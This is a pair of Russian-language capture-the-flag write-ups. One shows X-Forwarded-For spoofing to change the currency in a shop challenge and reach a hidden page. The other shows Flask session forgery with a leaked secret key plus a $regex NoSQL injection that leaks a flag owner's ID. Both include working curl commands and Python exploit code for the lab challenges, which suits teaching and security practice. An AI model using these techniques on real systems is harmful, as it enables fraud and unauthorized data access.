# [WEB] CTF Market – Currency Trick

**Флаг:** `CTFCup{Cur3ncy_Tr1ck5_N3v3r_F41L}`  

## Идея

В фронтенде есть legacy-код:

- `shop.js` (старый `completePurchase`):
  - после успешной покупки был редирект на `/purchase-details?secret=premium`
  - бонус-код: `BONUS-CTF-COIN`
- `auth.js` (старый `authenticateUser`):

  ```js
  'X-Forwarded-For': getUserLocation() || '127.0.0.1'
  // DO NOT DELETE YET! (Mike, 2024-10-15)
  ```

Сервер использует `X-Forwarded-For` для определения региона и валюты/курса, а мы можем его подменить.

---

## Эксплуатация

1. **Логин с подменой IP на США**

   ```bash
   curl -X POST \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: 8.8.8.8" \
     -d '{"email": "ctf_c0c84c12@ctfmarket.com", "password": "cddd19febff79f7a"}' \
     -c cookies.txt \
     http://158.160.13.253:30621/api/auth
   ```

2. **Проверяем аккаунт**

   ```bash
   curl -b cookies.txt http://158.160.13.253:30621/api/account
   ```

   Важное из ответа:

   ```json
   {"coins":100,"currency":"RUB-USD","exchange_rate":80}
   ```

3. **Проверяем корзину**

   ```bash
   curl -b cookies.txt http://158.160.13.253:30621/api/basket
   ```

   Товар: `Premium CTF Membership (Annual)` за `8.75 USD`.

4. **Применяем бонус-код**

   ```bash
   curl -X POST \
     -b cookies.txt \
     "http://158.160.13.253:30621/api/bonus?code=BONUS-CTF-COIN"
   ```

5. **Завершаем покупку**

   ```bash
   curl -X POST \
     -b cookies.txt \
     http://158.160.13.253:30621/api/purchase
   ```

   Ответ: `{"response":"Purchase completed successfully"}`

6. **Ручной переход на скрытую страницу**

   ```bash
   curl -b cookies.txt \
     "http://158.160.13.253:30621/purchase-details?secret=premium"
   ```

   В ответе:

   ```html
   <p style="color: red; font-weight: bold;">
     CTFCup{Cur3ncy_Tr1ck5_N3v3r_F41L}
   </p>
   ```

---

## Суть бага

- Сервер доверяет клиентскому `X-Forwarded-For` и выбирает валюту/курс по нему.
- При IP из США наши 100 монет с выгодным курсом считаются достаточными для покупки.
- После успешной покупки legacy-страница `/purchase-details?secret=premium` всё ещё доступна и выдаёт флаг.

# Flask + MongoDB NoSQL Injection

## Суть уязвимости

Приложение использует данные сессии напрямую как фильтр для MongoDB:

```python
user_strings = list(mongo.db.strings.find(dict(session.items())))
```

- `session` берётся из cookie `session`, которую Flask подписывает `SECRET_KEY`:
  ```python
  app.config["SECRET_KEY"] = "kluchik"
  ```
- Зная ключ, можно самому генерировать валидные сессии.
- Содержимое сессии **не фильтруется** и попадает в запрос к MongoDB как есть.
- Это позволяет подставить в `user_id` не строку, а оператор MongoDB, например:
  ```python
  {"user_id": {"$regex": "^ab"}}
  ```
  → классическая NoSQL-инъекция.

Флаг хранится как документ:

```python
{"name": "flag", "user_id": <случайный hex>, "content": <FLAG>}
```

Наша цель — узнать этот `user_id` и прочитать флаг.

---

## Решение

1. **Генерируем свои сессии Flask**

   Используем тот же `SECRET_KEY = "kluchik"`:

   ```python
   from flask import Flask, session

   app = Flask(__name__)
   app.secret_key = "kluchik"

   def encode_session(data):
       with app.test_request_context():
           session.update(data)
           dumped = app.session_interface.get_signing_serializer(app).dumps(dict(session))
           return dumped.decode("utf-8") if isinstance(dumped, bytes) else dumped
   ```

   Теперь `encode_session({"user_id": "...", "name": "flag"})` вернёт корректное значение для cookie `session`.

2. **Используем /strings для утечки `user_id`**

   Подставляем в сессию `user_id` с `$regex` и отправляем запрос:

   ```python
   data = {
       "name": "flag",
       "user_id": {"$regex": "^ab"}  # проверяем, начинается ли user_id флага с "ab"
   }
   cookie_value = encode_session(data)
   cookies = {"session": cookie_value}

   r = requests.get("http://host/strings", cookies=cookies)
   ```

   Логика:

   - Если в ответе статус `401` и ошибка `"ooops, some string is not you own"` → найден документ с `name="flag"` и `user_id`, подходящим под regex → текущий префикс **верный**.
   - Если `{"strings": []}` → подходящего документа нет → префикс **неверный**.

   Повторяем это, перебирая hex-символы `0-9a-f` для каждой позиции `user_id` (в примере — бинарный поиск по диапазону), пока не получим полный 64-символьный hex.

3. **Читаем флаг**

   Когда `leaked_user_id` готов:

   ```python
   data = {"user_id": leaked_user_id}
   cookie_value = encode_session(data)
   cookies = {"session": cookie_value}

   r = requests.get("http://host/strings/flag", cookies=cookies)
   print(r.json()["content"])  # здесь будет FLAG
   ```

   Приложение считает, что мы — владелец документа с таким `user_id`, и отдаёт содержимое флага.

---

## Итог

- Уязвимость: прямое использование `dict(session.items())` в `mongo.db.strings.find(...)`.
- Эксплойт: подделка Flask-сессий (зная `SECRET_KEY`) + NoSQL-инъекция через `$regex` в `user_id`, посимвольная утечка `user_id` флага и дальнейшее чтение `/strings/flag`.
